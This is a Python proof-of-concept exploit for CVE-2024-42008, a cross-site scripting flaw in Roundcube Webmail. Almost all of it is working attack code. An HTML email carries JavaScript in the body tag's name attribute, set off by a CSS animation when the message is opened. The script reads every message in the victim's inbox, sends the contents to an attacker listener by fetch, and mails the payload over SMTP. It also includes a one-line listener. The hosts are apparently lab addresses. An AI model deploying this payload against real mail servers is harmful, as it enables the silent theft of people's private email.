#!/usr/bin/env python3
"""
CVE-2024-42008 - Roundcube Webmail XSS Email Exfiltration
=========================================================
Affected versions: Roundcube Webmail < 1.6.8

The vulnerability exists in insufficient sanitisation of the HTML <body> tag's
name attribute. By injecting a CSS animation-name set to the Bootstrap class
'progress-bar-stripes' (already loaded by Roundcube), the animation fires
automatically when the email is rendered — no click required from the victim.

The injected JavaScript runs in the victim's authenticated session and exfiltrates
inbox contents using relative URLs (bypassing network isolation between victim
and attacker). Only the final callback reaches the attacker's listener.

Usage:
    # Start listener first:
    python3 -c "
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            print('[GET]', self.path)
            self.send_response(200); self.end_headers()
        def log_message(self, *a): pass
    HTTPServer(('0.0.0.0', 9999), H).serve_forever()"

    # Then send the payload:
    python3 xss_payload.py

Reference: https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/
CVE: CVE-2024-42008
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ── Config ────────────────────────────────────────────────────────────────────
SMTP_HOST   = "192.168.64.4"
SMTP_PORT   = 25
FROM_ADDR   = "test@hacking.local"
TO_ADDR     = "webmaster@hacking.local"
ATTACKER_IP = "192.168.64.3"
ATTACKER_PORT = 9999
# ─────────────────────────────────────────────────────────────────────────────

# The entire injection MUST be on one line inside the name attribute.
# Any line break breaks the CSS animation and the payload silently fails.
html = f"""<html><body title='bgcolor=foo' name='bar style=animation-name:progress-bar-stripes onanimationstart=fetch(&apos;/?_task=mail&_action=list&_mbox=INBOX&_page=&_remote=1&apos;).then(r=>r.text()).then(t=>{{[...t.matchAll(/this\\.add_message_row\\((\\d+),/g)].forEach(m=>{{fetch(&apos;/?_task=mail&_uid=&apos;+m[1]+&apos;&_mbox=INBOX&_action=viewsource&apos;).then(r=>r.text()).then(data=>{{fetch(&apos;http://{ATTACKER_IP}:{ATTACKER_PORT}/?data=&apos;+encodeURIComponent(data))}})}})}}); foo=bar'><p>Notice.</p></body></html>"""

msg = MIMEMultipart('alternative')
msg['From']    = FROM_ADDR
msg['To']      = TO_ADDR
msg['Subject'] = 'Important Notice'
msg.attach(MIMEText('Notice.', 'plain'))
msg.attach(MIMEText(html, 'html'))

print(f"[*] Sending CVE-2024-42008 payload to {TO_ADDR}...")
with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as s:
    s.sendmail(FROM_ADDR, TO_ADDR, msg.as_string())
print("[+] Sent! Watch your listener on port", ATTACKER_PORT)
print("[*] When the victim opens the email, their inbox will be exfiltrated.")
